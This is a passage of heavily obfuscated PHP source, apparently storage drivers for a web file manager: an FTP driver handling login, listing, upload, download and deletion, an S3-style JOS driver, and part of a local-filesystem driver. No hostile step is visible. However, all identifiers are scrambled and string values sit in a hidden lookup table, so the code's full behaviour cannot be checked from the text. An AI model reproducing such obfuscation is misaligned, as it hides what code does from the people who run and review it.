$_SERVER[É¨™èà]; $…°ÔëÈŸ = $Í£ŒŸÊ«[12]; if (!empty($ŒÆ´‰ñ„)) { $ŒÆ´‰ñ„ = explode($Í£ŒŸÊ«[50], $ŒÆ´‰ñ„); if (count($ŒÆ´‰ñ„) > 1) { $…°ÔëÈŸ .= $Í£ŒŸÊ«[51] . $ŒÆ´‰ñ„[1] . $Í£ŒŸÊ«[52] . $ŒÆ´‰ñ„[0] . $Í£ŒŸÊ«[53]; } else { $…°ÔëÈŸ .= $Í£ŒŸÊ«[51] . $ŒÆ´‰ñ„[0] . $Í£ŒŸÊ«[53]; } } return $…°ÔëÈŸ; } } goto Eé¦ö‘³ÛÄ; Aä‚¾ºÀ‘æ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($›ÊşÉ¡ˆ) { parent::__construct(); if (count($›ÊşÉ¡ˆ) > 0) { $this->_init($›ÊşÉ¡ˆ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($³ğ”şøä) { $Í¤íøù =& $_SERVER[É¨™èà]; global $config; $this->appCharset = $config[$Í¤íøù[1467]]; $this->systemCharset = $config[$Í¤íøù[1468]]; if (isset($³ğ”şøä[$Í¤íøù[1469]]) && $³ğ”şøä[$Í¤íøù[1469]]) { $this->systemCharset = $³ğ”şøä[$Í¤íøù[1469]]; } } public function iconvApp($¬½µí‹§) { return $this->iconvTo($¬½µí‹§, $this->systemCharset, $this->appCharset); } public function iconvSystem($¯±òÒìå) { return $this->iconvTo($¯±òÒìå, $this->appCharset, $this->systemCharset); } public function getPathOuter($ò›ŒÁã) { $À£òğ¨Ò =& $_SERVER[É¨™èà]; $Áß¸Æ§Š = $this->iconvApp($this->pathBase); $ò›ŒÁã = $this->iconvApp($ò›ŒÁã); if (substr($Áß¸Æ§Š, 0, 2) == $À£òğ¨Ò[1438]) { $Áß¸Æ§Š = BASIC_PATH . substr($Áß¸Æ§Š, 2); } if (substr($ò›ŒÁã, 0, 2) == $À£òğ¨Ò[1438]) { $ò›ŒÁã = BASIC_PATH . substr($ò›ŒÁã, 2); } $Áß¸Æ§Š = KodIO::clear($Áß¸Æ§Š); $ò›ŒÁã = KodIO::clear($ò›ŒÁã); $ò›ŒÁã = substr($ò›ŒÁã, strlen($Áß¸Æ§Š)); if (empty($this->pathDriver)) { return $ò›ŒÁã; } return $this->pathDriver . $À£òğ¨Ò[8] . ltrim($ò›ŒÁã, $À£òğ¨Ò[8]); } private function _init($‡«­–è§ = array()) { $î©ÌËË¼ =& $_SERVER[É¨™èà]; if (!function_exists($î©ÌËË¼[1470])) { throw new Exception(LNG($î©ÌËË¼[1471])); } $this->config = $‡«­–è§; $this->charsetReset($‡«­–è§); foreach ($‡«­–è§ as $Èßİºé => $¯•–ªí¬) { if (isset($this->{$Èßİºé})) { $this->{$Èßİºé} = $¯•–ªí¬; } } return $this->_login($‡«­–è§); } private function _login($ƒ·Â•Ü) { $åò±—œ° =& $_SERVER[É¨™èà]; static $‰ì°ì¿ = array(); $”æ‘ıÎÈ = md5(json_encode($ƒ·Â•Ü)); if (isset($‰ì°ì¿[$”æ‘ıÎÈ])) { foreach ($‰ì°ì¿[$”æ‘ıÎÈ] as $â î¶ô” => $É§‹õù±) { $this->{$â î¶ô”} = $É§‹õù±; } return !0; } $ĞóÆüïŞ = parse_url(trim($this->server, $åò±—œ°[8])); $this->host = $ĞóÆüïŞ[$åò±—œ°[209]]; $¬ì†¼ƒˆ = isset($ĞóÆüïŞ[$åò±—œ°[208]]) && $ĞóÆüïŞ[$åò±—œ°[208]] == $åò±—œ°[1472] ? !0 : !1; $this->scheme = $¬ì†¼ƒˆ ? $åò±—œ°[1473] : $åò±—œ°[1474]; $this->port = isset($ĞóÆüïŞ[$åò±—œ°[210]]) ? $ĞóÆüïŞ[$åò±—œ°[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($åò±—œ°[1475]) . $this->host . $åò±—œ°[4] . $this->port, !0); return !1; } $ë×§…‰ğ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$ë×§…‰ğ) { $this->writeLog(LNG($åò±—œ°[1476]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $åò±—œ°[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Ä¸ø£ = $this->pasv == $åò±—œ°[91] ? !0 : !1; @ftp_pasv($this->connect, $Ä¸ø£); $‰ì°ì¿[$”æ‘ıÎÈ] = array($åò±—œ°[1477] => $this->connect, $åò±—œ°[209] => $this->host, $åò±—œ°[208] => $this->scheme, $åò±—œ°[210] => $this->port); return $ë×§…‰ğ; } private function _isconn($·ŞÎ·”¼ = true) { if (is_resource($this->connect)) { return !0; } if (!$·ŞÎ·”¼) { return !1; } return $this->_login($this->config); } public function mkfile($¦¥Òê«Ï, $©•ê‚Îı = '', $éÓ‚ÒµŞ = REPEAT_RENAME) { if ($this->setContent($¦¥Òê«Ï, $©•ê‚Îı)) { return $this->getPathOuter($¦¥Òê«Ï); } $this->writeLog(LNG($_SERVER[É¨™èà][1478]), !0); return !1; } public function mkdir($ÜŞ’¡, $€À­…áÎ = REPEAT_SKIP) { $Š‹æ¿” =& $_SERVER[É¨™èà]; if (!$ÜŞ’¡ || $ÜŞ’¡ == $Š‹æ¿”[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ÜŞ’¡ = $this->iconvSystem($ÜŞ’¡); if ($this->_isFolder($ÜŞ’¡) || @ftp_mkdir($this->connect, $ÜŞ’¡)) { return $this->getPathOuter($ÜŞ’¡); } if (!$this->mkdir($this->pathFather($ÜŞ’¡))) { return !1; } if ($ÜŞ’¡ = @ftp_mkdir($this->connect, $ÜŞ’¡)) { return $this->getPathOuter($ÜŞ’¡); } $Å™½šàØ = __FUNCTION__ . $Š‹æ¿”[1479]; $this->writeLog($Å™½šàØ, !0); return !1; } public function copyFile($¸üÄåœà, $À¯°ÖÇ) { if (!$this->_isconn()) { return !1; } $¶éœ¸ê¨ = $this->pathThis($this->iconvSystem($¸üÄåœà)); $ğê™µıÔ = $this->tempFile($¶éœ¸ê¨); $‰‹øÏƒÄ = $this->iconvApp($ğê™µıÔ); $this->download($¸üÄåœà, $‰‹øÏƒÄ); $®ùü¾Ğ = $this->upload($À¯°ÖÇ, $‰‹øÏƒÄ); $this->tempFileRemve($ğê™µıÔ); return $®ùü¾Ğ; } public function moveFile($¨åå„ì£, $Ï§„£™) { if (!$this->_isconn()) { return !1; } $¨åå„ì£ = $this->iconvSystem($¨åå„ì£); $Ï§„£™ = $this->iconvSystem($Ï§„£™); $¾ş‹±»ü = @ftp_rename($this->connect, $¨åå„ì£, $Ï§„£™); if (!$¾ş‹±»ü) { $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][1479], !0); return !1; } return $this->getPathOuter($Ï§„£™); } public function delFile($‡‡ú¬ÀŸ) { if (!$this->_isconn()) { return !1; } $‡‡ú¬ÀŸ = $this->iconvSystem($‡‡ú¬ÀŸ); $¨íÙ¢¾ã = @ftp_delete($this->connect, $‡‡ú¬ÀŸ); if (!$¨íÙ¢¾ã) { $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][1479], !0); } return $¨íÙ¢¾ã; } public function delFolder($·¢ÜÙÈÁ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Ùï†¿û = $ÂÍ¢¤Ş = array(); $this->fileList($·¢ÜÙÈÁ, $Ùï†¿û, $ÂÍ¢¤Ş, !0); $this->listItemCache = !0; foreach ($ÂÍ¢¤Ş as $¾ËãË‰ˆ) { $ò‡üà = $this->iconvSystem($¾ËãË‰ˆ[$_SERVER[É¨™èà][32]]); $úÒ—„«À = @ftp_delete($this->connect, $ò‡üà); if (!$úÒ—„«À) { return !1; } } foreach ($Ùï†¿û as $ò‡üà) { $ò‡üà = $this->iconvSystem($ò‡üà); $úÒ—„«À = @ftp_rmdir($this->connect, $ò‡üà); if (!$úÒ—„«À) { return !1; } } $·¢ÜÙÈÁ = $this->iconvSystem($·¢ÜÙÈÁ); return @ftp_rmdir($this->connect, $·¢ÜÙÈÁ); } public function rename($‰²—©·¥, $ö¹¾ÖÃš) { $¢¥‰¬Ï› =& $_SERVER[É¨™èà]; if (!$this->_isconn()) { return !1; } $‚ñª¼†¦ = $this->fileNameAuto($this->pathFather($‰²—©·¥), $ö¹¾ÖÃš); $‚ñª¼†¦ = $this->iconvSystem($‚ñª¼†¦); $‰²—©·¥ = $this->iconvSystem($‰²—©·¥); $£Æ¼ÑÎ = $this->pathFather($‰²—©·¥); $ÉÜ¼úÖ = rtrim($£Æ¼ÑÎ, $¢¥‰¬Ï›[8]) . $¢¥‰¬Ï›[8] . $‚ñª¼†¦; $Á¬ìåÉ¤ = @ftp_rename($this->connect, $‰²—©·¥, $ÉÜ¼úÖ); if (!$Á¬ìåÉ¤) { $this->writeLog(__FUNCTION__ . $¢¥‰¬Ï›[1479], !0); return !1; } $ÉÜ¼úÖ = $this->iconvApp($ÉÜ¼úÖ); return $this->getPathOuter($ÉÜ¼úÖ); } private function folderInfo($ÊÈ’šÄ, $’ŒÂ¡í = false) { $Ô—¡„Ï­ =& $_SERVER[É¨™èà]; $òÕ‘‰—ü = array($Ô—¡„Ï­[32] => $this->pathThis($ÊÈ’šÄ), $Ô—¡„Ï­[87] => $this->getPathOuter($Ô—¡„Ï­[8] . $ÊÈ’šÄ), $Ô—¡„Ï­[33] => $Ô—¡„Ï­[78]); if ($’ŒÂ¡í) { return $òÕ‘‰—ü; } $òÕ‘‰—ü[$Ô—¡„Ï­[234]] = $òÕ‘‰—ü[$Ô—¡„Ï­[88]] = 0; $òÕ‘‰—ü[$Ô—¡„Ï­[235]] = $òÕ‘‰—ü[$Ô—¡„Ï­[236]] = !0; return $òÕ‘‰—ü; } private function fileInfo($ãá›ĞğŞ, $¬¯Ùˆ® = false, $ÈıÀ²ß = array()) { $ı¯Ëµï€ =& $_SERVER[É¨™èà]; $ù¶‡ñÄ™ = array($ı¯Ëµï€[32] => $this->pathThis($ãá›ĞğŞ), $ı¯Ëµï€[87] => $this->getPathOuter($ı¯Ëµï€[8] . $ãá›ĞğŞ), $ı¯Ëµï€[33] => $ı¯Ëµï€[233], $ı¯Ëµï€[79] => isset($ÈıÀ²ß[$ı¯Ëµï€[79]]) ? $ÈıÀ²ß[$ı¯Ëµï€[79]] : 0, $ı¯Ëµï€[169] => $this->ext($ãá›ĞğŞ)); if ($¬¯Ùˆ®) { return $ù¶‡ñÄ™; } $ù¶‡ñÄ™[$ı¯Ëµï€[234]] = $ù¶‡ñÄ™[$ı¯Ëµï€[88]] = 0; $ù¶‡ñÄ™[$ı¯Ëµï€[235]] = $ù¶‡ñÄ™[$ı¯Ëµï€[236]] = !0; $§Ô¡ú­¶ = $this->iconvSystem($ãá›ĞğŞ); $ù¶‡ñÄ™[$ı¯Ëµï€[88]] = @ftp_mdtm($this->connect, $§Ô¡ú­¶); if (empty($ÈıÀ²ß)) { $ÈıÀ²ß = $this->objectMeta($ãá›ĞğŞ); if (!$ÈıÀ²ß) { return $ù¶‡ñÄ™; } } $ù¶‡ñÄ™[$ı¯Ëµï€[79]] = $ÈıÀ²ß[$ı¯Ëµï€[79]]; return $ù¶‡ñÄ™; } public function size($éƒùöÏ) { $°¤İğ…² = $this->objectMeta($éƒùöÏ); return $°¤İğ…² ? $°¤İğ…²[$_SERVER[É¨™èà][79]] : 0; } public function info($†¥£Ú) { if ($this->isFile($†¥£Ú)) { return $this->fileInfo($†¥£Ú, 0); } else { if ($this->isFolder($†¥£Ú)) { return $this->folderInfo($†¥£Ú); } } return !1; } private function fileList($İçƒŠÑ½, &$²·ü¸áÄ, &$×Åé¿ò, $æÙî÷ñ = false) { $ü©Îœ²© =& $_SERVER[É¨™èà]; $İçƒŠÑ½ = $this->iconvSystem($İçƒŠÑ½); if (!$this->isFolder($İçƒŠÑ½)) { return !1; } $İçƒŠÑ½ = rtrim($İçƒŠÑ½, $ü©Îœ²©[8]) . $ü©Îœ²©[8]; check_abort(); $½ğ³“»ï = @ftp_rawlist($this->connect, $İçƒŠÑ½); if (!$½ğ³“»ï) { $½ğ³“»ï = array(); } $Ø¦¾ò¼ = array($ü©Îœ²©[10] => 1, $ü©Îœ²©[1383] => 1); foreach ($½ğ³“»ï as $İ‰šíÀ) { $àİ—¿¨ = $this->_listItem($İ‰šíÀ); if ($àİ—¿¨[0] == $ü©Îœ²©[849]) { continue; } $áéƒËßÃ = $àİ—¿¨[8]; if (empty($áéƒËßÃ) && $áéƒËßÃ !== $ü©Îœ²©[231] || isset($Ø¦¾ò¼[$áéƒËßÃ])) { continue; } $áéƒËßÃ = $this->iconvApp($İçƒŠÑ½ . ltrim($áéƒËßÃ, $ü©Îœ²©[8])); $ÁÌúş÷× = array($ü©Îœ²©[32] => $áéƒËßÃ, $ü©Îœ²©[33] => $ü©Îœ²©[233], $ü©Îœ²©[79] => $àİ—¿¨[4]); if (substr($İ‰šíÀ, 0, 1) == $ü©Îœ²©[1480]) { $ÁÌúş÷×[$ü©Îœ²©[33]] = $ü©Îœ²©[78]; $ÁÌúş÷×[$ü©Îœ²©[79]] = 0; } $£—©ÂË™ = $ÁÌúş÷×[$ü©Îœ²©[33]] == $ü©Îœ²©[78] ? !0 : !1; $this->cacheMethodInfoSet($áéƒËßÃ, $£—©ÂË™, $ÁÌúş÷×); if ($£—©ÂË™) { $²·ü¸áÄ[] = $áéƒËßÃ; if ($æÙî÷ñ) { $this->fileList($áéƒËßÃ, $²·ü¸áÄ, $×Åé¿ò, $æÙî÷ñ); } continue; } $×Åé¿ò[] = $ÁÌúş÷×; } $this->cacheMethodInfoSet($İçƒŠÑ½, !0); } private function _listItem($©›Ş¤µû) { if (empty($©›Ş¤µû)) { return array(); } $ã¨áŸ‡Ñ = preg_split($_SERVER[É¨™èà][1481], $©›Ş¤µû); if (count($ã¨áŸ‡Ñ) <= 9) { return $ã¨áŸ‡Ñ; } $ã¨áŸ‡Ñ[8] = trim(substr($©›Ş¤µû, strpos($©›Ş¤µû, $ã¨áŸ‡Ñ[7]) + strlen($ã¨áŸ‡Ñ[7]))); return array_splice($ã¨áŸ‡Ñ, 0, 9); } public function listPath($¢Éî‡ÕÒ, $Òü“åòó = false) { $é–ß·çï =& $_SERVER[É¨™èà]; if (!$this->_isconn()) { return !1; } $¦Õ¹¢¿ = $‹ëüÁ‡æ = array(); $this->fileList($¢Éî‡ÕÒ, $¦Õ¹¢¿, $‹ëüÁ‡æ); foreach ($¦Õ¹¢¿ as $ÜÓûçÎı => $ÀÓ¿’) { $¦Õ¹¢¿[$ÜÓûçÎı] = $this->folderInfo($ÀÓ¿’, $Òü“åòó); } foreach ($‹ëüÁ‡æ as $ÜÓûçÎı => $ÀÓ¿’) { $‹ëüÁ‡æ[$ÜÓûçÎı] = $this->fileInfo($ÀÓ¿’[$é–ß·çï[32]], $Òü“åòó, $ÀÓ¿’); } return array($é–ß·çï[85] => $¦Õ¹¢¿, $é–ß·çï[86] => $‹ëüÁ‡æ); } public function has($ñû”ƒ¤Ê, $àË”öÛ… = false, $Üõï—ºğ = true) { $Ä¢‚›úè =& $_SERVER[É¨™èà]; $É†æ¿¿” = $ü‹ºóÉ» = array(); $®íú†” = $àË”öÛ… ? !0 : !1; $this->fileList($ñû”ƒ¤Ê, $É†æ¿¿”, $ü‹ºóÉ», $®íú†”); if ($àË”öÛ…) { return array($Ä¢‚›úè[242] => count($ü‹ºóÉ»), $Ä¢‚›úè[243] => count($É†æ¿¿”)); } if ($Üõï—ºğ) { if (count($ü‹ºóÉ»)) { return !0; } } else { if (count($É†æ¿¿”)) { return !0; } } return !1; } public function listAll($ĞõÇÇé‰) { $šïº—œ€ =& $_SERVER[É¨™èà]; if (!$this->_isconn()) { return !1; } $ıÔÑÅµ = $Ø£Ú÷İ = array(); $this->fileList($ĞõÇÇé‰, $ıÔÑÅµ, $Ø£Ú÷İ, !0); $À°ßÊèã = array_to_keyvalue($Ø£Ú÷İ, $šïº—œ€[32]); foreach ($ıÔÑÅµ as $‹¢‚ñà¶) { if (is_string($‹¢‚ñà¶)) { $À°ßÊèã[$‹¢‚ñà¶] = array($šïº—œ€[79] => 0); } } return $this->listAllFiles($ĞõÇÇé‰, $À°ßÊèã); } public function getContent($®¹Ô¬¦§) { if (!$this->_isconn()) { return !1; } $®¹Ô¬¦§ = $this->iconvSystem($®¹Ô¬¦§); return $this->fileSubstr($®¹Ô¬¦§); } public function setContent($²ã‡ò¶•, $·£Şäß“ = '') { if (!$this->_isconn()) { return !1; } $²Ïµ¯› = $this->pathThis($this->iconvSystem($²ã‡ò¶•)); $×¾¬ˆ×« = $this->tempFile($²Ïµ¯›); file_put_contents($×¾¬ˆ×«, $·£Şäß“); $‘Ñ¨ı“µ = $this->upload($²ã‡ò¶•, $this->iconvApp($×¾¬ˆ×«)); $this->tempFileRemve($×¾¬ˆ×«); return $‘Ñ¨ı“µ; } public function fileSubstr($ÙøØ¬ôÓ, $¹Üç„ìÔ = 0, $Ší—Ãà = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ÙøØ¬ôÓ, $¹Üç„ìÔ, $Ší—Ãà); } private function ftpRequest($İ¿¤¨¬º, $£·¿¶œ = 0, $ÛÄÇ„Ø÷ = false) { $¨ÑÔÂŠ™ =& $_SERVER[É¨™èà]; $İ¿¤¨¬º = $¨ÑÔÂŠ™[8] . ltrim(str_ltrim($İ¿¤¨¬º, $this->ftpPath), $¨ÑÔÂŠ™[8]); $İ¿¤¨¬º = $this->iconvSystem($İ¿¤¨¬º); $½ÂÛ “È = $this->scheme . $this->host . $¨ÑÔÂŠ™[4] . $this->port; $Îõ¹€Î¡ = curl_init(); curl_setopt($Îõ¹€Î¡, CURLOPT_URL, $½ÂÛ “È . $this->pathEncode($İ¿¤¨¬º)); curl_setopt($Îõ¹€Î¡, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ÛÄÇ„Ø÷) { $Ø¤£¸° = $£·¿¶œ + $ÛÄÇ„Ø÷ - 1; curl_setopt($Îõ¹€Î¡, CURLOPT_RANGE, "{$£·¿¶œ}\x2d{$Ø¤£¸°}"); } curl_setopt($Îõ¹€Î¡, CURLOPT_RETURNTRANSFER, 1); $×ß­’Ã¦ = curl_exec($Îõ¹€Î¡); curl_close($Îõ¹€Î¡); return $×ß­’Ã¦; } public function upload($„–ÅºˆÊ, $™´·Ğ¼, $ËÍš÷ã— = false, $õ¦ïÄ¿È = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($„–ÅºˆÊ))) { return !1; } $„–ÅºˆÊ = $this->iconvSystem($„–ÅºˆÊ); $™´·Ğ¼ = $this->iconvSystem($™´·Ğ¼); $¹ò©ß± = ftp_nb_put($this->connect, $„–ÅºˆÊ, $™´·Ğ¼, FTP_BINARY); while ($¹ò©ß± == FTP_MOREDATA) { $¹ò©ß± = ftp_nb_continue($this->connect); } if ($¹ò©ß± != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][1479], !0); return !1; } return $this->getPathOuter($„–ÅºˆÊ); } public function download($„“Ğå‰, $ÕŒäá¿Ä = '') { if (!$this->_isconn()) { return !1; } $ß­×å‚Ş = $this->pathFather($ÕŒäá¿Ä); if (!IO::mkdir($ß­×å‚Ş)) { return !1; } $„“Ğå‰ = $this->iconvSystem($„“Ğå‰); $ÕŒäá¿Ä = $this->iconvSystem($ÕŒäá¿Ä); $²Û—µÀ = ftp_nb_get($this->connect, $ÕŒäá¿Ä, $„“Ğå‰, FTP_BINARY); while ($²Û—µÀ == FTP_MOREDATA) { $²Û—µÀ = ftp_nb_continue($this->connect); } if ($²Û—µÀ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][1479], !0); return !1; } return $this->iconvApp($ÕŒäá¿Ä); } public function exist($šİ¶ÈÀº) { return $this->isFile($šİ¶ÈÀº) || $this->isFolder($šİ¶ÈÀº); } public function isFile($â”¶Ò) { return !$this->isFolder($â”¶Ò) && $this->objectMeta($â”¶Ò); } public function isFolder($×üŸÄ¨î) { return $this->cacheMethod($_SERVER[É¨™èà][180], $×üŸÄ¨î); } protected function objectMeta($éÛ½¶) { return $this->cacheMethod($_SERVER[É¨™èà][182], $éÛ½¶); } protected function _objectMeta($ ¾÷Ü‹) { $ëÍğÚËÃ =& $_SERVER[É¨™èà]; if ($ ¾÷Ü‹ == $ëÍğÚËÃ[12] || $ ¾÷Ü‹ == $ëÍğÚËÃ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ ¾÷Ü‹ = $this->iconvSystem($ ¾÷Ü‹); $”³˜çÄ = array($ëÍğÚËÃ[32] => $this->iconvApp($ ¾÷Ü‹), $ëÍğÚËÃ[33] => $ëÍğÚËÃ[233], $ëÍğÚËÃ[79] => 0); $ÛßÂÆÇÇ = @ftp_size($this->connect, $ ¾÷Ü‹); if ($ÛßÂÆÇÇ != -1) { $”³˜çÄ[$ëÍğÚËÃ[79]] = $ÛßÂÆÇÇ; } else { $ªàã¬‡Â = @ftp_chdir($this->connect, $ ¾÷Ü‹); if (!$ªàã¬‡Â) { return !1; } @ftp_chdir($this->connect, $ëÍğÚËÃ[8]); $”³˜çÄ[$ëÍğÚËÃ[33]] = $ëÍğÚËÃ[78]; } return $”³˜çÄ; } protected function _isFolder($ùÆÁ¶™) { $Ë’×ú®¡ =& $_SERVER[É¨™èà]; if ($ùÆÁ¶™ == $Ë’×ú®¡[12] || $ùÆÁ¶™ == $Ë’×ú®¡[8]) { return !0; } $§ĞÕËú = $this->_objectMeta($ùÆÁ¶™); return isset($§ĞÕËú[$Ë’×ú®¡[33]]) && $§ĞÕËú[$Ë’×ú®¡[33]] == $Ë’×ú®¡[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($¼¥¸÷‹”) { parent::__construct($¼¥¸÷‹”); $this->setSignVersion($_SERVER[É¨™èà][250]); } public function uploadLink($°Í£æ˜, $ãÊ ÔûÖ = 0) { $¼±Ìé¹» =& $_SERVER[É¨™èà]; if ($this->isUploadServer()) { return; } $ªçü£˜“ = $this->getType(); if (!in_array($ªçü£˜“, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $òé°¢¢ = (!$ãÊ ÔûÖ ? 1 : ceil($ãÊ ÔûÖ / pow(1024, 3))) * 3600 * 4; $ıûó‰é = $this->uploadMultiData($°Í£æ˜, $òé°¢¢); if ($ıûó‰é) { $ıûó‰é[$¼±Ìé¹»[97]] = $°Í£æ˜; $ıûó‰é[$¼±Ìé¹»[98]] = $ªçü£˜“; } return $ıûó‰é; } public function fileOutImage($û±â¤ô, $öƒ¹”ú½ = 250) { if ($this->size($û±â¤ô) > 1024 * 1024 * 25) { return $this->fileOutImageServer($û±â¤ô, $öƒ¹”ú½); } $ÇÁå¶Ğè = $this->link($û±â¤ô); $ÇÁå¶Ğè .= $_SERVER[É¨™èà][1482] . $öƒ¹”ú½; $this->fileOutLink($ÇÁå¶Ğè); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¬©øó¿ã) { if (substr($¬©øó¿ã, 0, 2) == $_SERVER[É¨™èà][1438]) { $¬©øó¿ã = BASIC_PATH . substr($¬©øó¿ã, 2); } return $¬©øó¿ã; } public function iconvApp($¹¸ê¬ ı) { $ç«ËáÍŸ =& $_SERVER[É¨™èà]; global $config; return $this->iconvTo($¹¸ê¬ ı, $config[$ç«ËáÍŸ[1468]], $config[$ç«ËáÍŸ[1467]]); } public function iconvSystem($Ä¦ÒÃØ) { $¿úÀØ¸å =& $_SERVER[É¨™èà]; global $config; return $this->iconvTo($Ä¦ÒÃØ, $config[$¿úÀØ¸å[1467]], $config[$¿úÀØ¸å[1468]]); } public function getPathOuter($üá’®Šû) { $ÓèÚİÃ¶ =& $_SERVER[É¨™èà]; $ÌÁæ¬·› = $this->iconvApp($this->pathBase); $üá’®Šû = $this->iconvApp($üá’®Šû); if (substr($ÌÁæ¬·›, 0, 2) == $ÓèÚİÃ¶[1438]) { $ÌÁæ¬·› = BASIC_PATH . substr($ÌÁæ¬·›, 2); } if (substr($üá’®Šû, 0, 2) == $ÓèÚİÃ¶[1438]) { $üá’®Šû = BASIC_PATH . substr($üá’®Šû, 2); } $ÌÁæ¬·› = KodIO::clear($ÌÁæ¬·›); $üá’®Šû = KodIO::clear($üá’®Šû); $üá’®Šû = substr($üá’®Šû, strlen($ÌÁæ¬·›)); if (empty($this->pathDriver)) { return $üá’®Šû; } return $this->pathDriver . $ÓèÚİÃ¶[8] . ltrim($üá’®Šû, $ÓèÚİÃ¶[8]); } public function mkfile($”¬ğ£È, $Æî˜İê = '', $º¯—ÕÄÅ = REPEAT_RENAME) { $”¬ğ£È = $this->iconvSystem($”¬ğ£È); @touch($”¬ğ£È); if ($Æî˜İê) { file_put_contents($”¬ğ£È, $Æî˜İê); } @chmod($”¬ğ£È, $this->pathAuth); if (is_file($”¬ğ£È)) { return $this->getPathOuter($”¬ğ£È); } $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][1479], !0); return !1; } public function mkdir($ô…¢˜Ìä, $ŞË¸ã£ü = REPEAT_SKIP) { $ô…¢˜Ìä = $this->iconvSystem($ô…¢˜Ìä); if (is_dir($ô…¢˜Ìä)) { return $this->getPathOuter($ô…¢˜Ìä); } @mkdir($ô…¢˜Ìä, $this->pathAuth, !0); @chmod($ô…¢˜Ìä, $this->pathAuth); if (is_dir($ô…¢˜Ìä)) { return $this->getPathOuter($ô…¢˜Ìä); } $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][1479], !0); return !1; } public function copyFile($²‹Æ‹Ğı, $¸Ğ™®ò«) { $this->mkdir($this->pathFather($¸Ğ™®ò«)); $²‹Æ‹Ğı = $this->iconvSystem($²‹Æ‹Ğı); $¸Ğ™®ò« = $this->iconvSystem($¸Ğ™®ò«); $åå€Ô º = copy_64($²‹Æ‹Ğı, $¸Ğ™®ò«); @chmod($¸Ğ™®ò«, $this->pathAuth); if ($åå€Ô º) { return $this->getPathOuter($¸Ğ™®ò«); } $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][1479], !0); return !1; } public function moveFile($ºªş¢’“, $øÛ‚šİÉ) { $this->mkdir($this->pathFather($øÛ‚šİÉ)); $ºªş¢’“ = $this->iconvSystem($ºªş¢’“); $øÛ‚šİÉ = $this->iconvSystem($øÛ‚šİÉ); $‡úäÃÛ™ = intval(@rename($ºªş¢’“, $øÛ‚šİÉ)); if (!$‡úäÃÛ™) { if ($‡úäÃÛ™ = intval(@copy_64($ºªş¢’“, $øÛ‚šİÉ))) { @unlink($ºªş¢’“); } } @chmod($øÛ‚šİÉ, $this->pathAuth); if ($‡úäÃÛ™) { return $this->getPathOuter($øÛ‚šİÉ); } $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][1479], !0); return !1; } public function movePath($Öşıòá, $¦éóÉ¤õ, $ œ²óõ = false) { $Œõ¥‰ˆ =& $_SERVER[É¨™èà]; $Öşıòá = $this->iconvSystem($Öşıòá); $¦éóÉ¤õ = $this->iconvSystem($¦éóÉ¤õ); $ˆ÷ë±Õ = rtrim($¦éóÉ¤õ, $Œõ¥‰ˆ[8]) . $Œõ¥‰ˆ[8] . ($ œ²óõ ? $ œ²óõ : get_path_this($Öşıòá)); if (file_exists($ˆ÷ë±Õ)) { return !1; } $ˆé‡§¾« = intval(@rename($Öşıòá, $ˆ÷ë±Õ)); $ˆé‡§¾« = file_exists($ˆ÷ë±Õ); if ($ˆé‡§¾«) { return $this->getPathOuter($ˆ÷ë±Õ); } $this->writeLog(__FUNCTION__ . $Œõ¥‰ˆ[1479], !0); return !1; } public function delFile($×ºŠÁ‡½) { $×ºŠÁ‡½ = $this->iconvSystem($×ºŠÁ‡½); if (!@unlink($×ºŠÁ‡½)) { @chmod($×ºŠÁ‡½, $this->pathAuth); if (@unlink($×ºŠÁ‡½)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[É¨™èà][1479], !0); return !1; } return !0; } public function delFolder($ƒ¸ËÁ¤÷) { $Ìæ‚Ó¢ =& $_SERVER[É¨™èà]; $ƒ¸ËÁ¤÷ = $this->iconvSystem($ƒ¸ËÁ¤÷); if (!is_dir($ƒ¸ËÁ¤÷)) { return !0; } if (!($ÈÊíû–Î = opendir($ƒ¸ËÁ¤÷))) { return !1; } while (($ƒíÓ¯é¾ = readdir($ÈÊíû–Î)) !== !1) { if ($ƒíÓ¯é¾ == $Ìæ‚Ó¢[10] || $ƒíÓ¯é¾ == $Ìæ‚Ó¢[1383]) { continue; } $ÀğÌÅƒÙ = $ƒ¸ËÁ¤÷ . $Ìæ‚Ó¢[8] . $ƒíÓ¯é¾; if (is_file($ÀğÌÅƒÙ) || is_link($ÀğÌÅƒÙ)) { if (!unlink($ÀğÌÅƒÙ)) { chmod($ÀğÌÅƒÙ, $this->pathAuth); if (!unlink($ÀğÌÅƒÙ)) { return !1; } } } else { if (is_dir($ÀğÌÅƒÙ)) { chmod($ÀğÌÅƒÙ, $this->pathAuth); $ÀğÌÅƒÙ = $this->iconvApp($ÀğÌÅƒÙ); if (!$this->delFolder($ÀğÌÅƒÙ)) { return !1; } } } } closedir($ÈÊíû–Î); return rmdir($ƒ¸ËÁ¤÷); } public function rename($½ëÀŸ˜, $Ññ¥æœ) { 